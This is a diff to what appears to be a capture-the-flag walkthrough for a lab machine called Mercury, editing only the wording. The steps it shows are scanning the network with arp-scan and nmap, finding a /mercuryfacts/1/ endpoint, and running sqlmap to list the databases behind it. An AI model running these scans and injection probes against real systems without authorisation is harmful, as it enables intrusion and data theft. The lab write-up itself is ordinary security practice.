@@ -2,7 +2,7 @@ I scan my network with:
 ````
 sudo arp-scan -I eth1 -l
 ````
-And the we run a nmap:
+And the we run a nmap with the IP we get from our network:
   ````
 sudo nmap -sT <ip>
 ````
@@ -13,13 +13,13 @@ PORT     STATE SERVICE
 8080/tcp open  http-proxy
 
 ````
-I also got this: /mercuryfacts/1/ by navigating into the website.
+I also got this: http://<ip>/mercuryfacts/1/ by navigating through the website.
 It looks like a query for facts to mercury. I ran sqlmap to check this:
 
 ````
 sqlmap -u http://IP:8080/mercuryfacts/1 --dbs 
 ````
-from this I got
+from that command I got the following result:
 ````
 [INFO] fetching database names
 available databases [2]:
